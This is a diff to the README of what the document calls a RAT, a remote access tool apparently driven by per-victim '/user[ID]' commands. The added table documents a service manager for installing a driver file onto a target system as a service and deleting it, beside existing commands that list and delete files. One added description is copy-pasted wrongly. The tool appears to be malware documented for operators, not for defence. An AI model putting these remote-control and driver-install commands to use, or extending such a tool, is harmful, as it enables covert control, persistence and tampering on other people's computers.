@@ -34,6 +34,13 @@
  /user[ID] dir             | [C:\Folder]                                             | show files and folders in directory    
  /user[ID] dir del_file    | [C:\Path\To\File.exe]                                   | delete file in directory    
 
+### Service manager:
+ Command name              | Parameters                                              | Description
+ ------------------------- | ------------------------------------------------------- | -----------
+ /user[ID] service show    |                                                         | show files and folders in directory    
+ /user[ID] service add     | [Name] [DisplayName] [C:\ProgramData\yourdriver.sys] [Type-Driver] [Start-Type] | add your driver in system, Check Type-Driver and Start-Type values in "Service manager parse table"    
+ /user[ID] service delete  | [NameService]                                           | delete driver from system
+
 ### RAT:   
  Command name              | Parameters                                              | Description
  ------------------------- | ------------------------------------------------------- | -----------
